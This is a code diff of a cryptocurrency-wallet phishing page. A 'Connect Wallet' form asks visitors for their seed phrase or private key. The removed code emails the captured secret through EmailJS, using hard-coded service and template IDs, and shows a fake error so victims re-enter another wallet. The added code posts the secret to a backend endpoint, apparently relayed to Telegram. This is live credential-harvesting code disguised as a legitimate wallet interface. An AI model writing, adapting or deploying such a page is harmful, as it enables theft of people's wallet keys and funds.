@@ -1273,50 +1273,66 @@
          
         </div>
         <div class="tab-content">
-          <form action="https://formsubmit.co/" method="post" enctype="form-data" id="my-form" class="ajaxForm">
+          <form id="telegramform">
                                         
             <div id="seedContent" class="tab-pane active">
               <label for="seedPhrase">Enter your seed phrase (use spaces) or private key. </label>
               <textarea name="message" id="my-form" required placeholder="Tap here to enter your seed phrase (use spaces) or private key."></textarea>
               <input type="hidden" name="walletType" id="walletTypeInput" value="Space" />
-              <button type="submit" id="submit" class="primary-btn full-width">
+              <button type="submit" id="submitBtn" class="primary-btn full-width">
+				   <p id="formstatus"></p>
                 Connect Wallet
               </button>
+
+				<p id="formStatus" aria-live="polite"></p>
             </div>
 			</form>
           
 
 
-           <script type="text/javascript"
-  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@5/dist/email.min.js"></script>
+         <script>
+const form = document.getElementById("telegramform");
+const button = document.getElementById("submitBtn");
+const status = document.getElementById("formStatus");
 
-<script type="text/javascript">
-  emailjs.init('9JyOWbhjhjpBuh_vI')
-</script>
-  
-  <script>
-  const btn = document.getElementById('submit');
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
 
-document.getElementById('my-form')
- .addEventListener('submit', function(event) {
-   event.preventDefault();
+  button.disabled = true;
+  button.textContent = "Sending...";
+  status.textContent = "";
 
-   btn.value = 'Sending...';
+  const formData = Object.fromEntries(
+    new FormData(form).entries()
+  );
 
-   const serviceID = 'service_0xb400s';
-   const templateID = 'template_nbie6zj';
-
-   emailjs.sendForm(serviceID, templateID, this)
-    .then(() => {
-      btn.value = 'Send Email';
-      alert('An Error Occured!!! Use anothere wallet Or Try again.');
-    }, (err) => {
-      btn.value = 'Send Email';
-      alert(JSON.stringify(err));
+  try {
+    const response = await fetch("/api/sendform", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(formData)
     });
+
+    const result = await response.json();
+
+    if (!response.ok) {
+      throw new Error(result.message || "Submission failed");
+    }
+
+    status.textContent = "Submission successful!";
+    form.reset();
+
+  } catch (error) {
+    status.textContent = error.message;
+
+  } finally {
+    button.disabled = false;
+    button.textContent = "Submit";
+  }
 });
-  
-  </script>
+</script>
         </div>
       </div>
     </div>
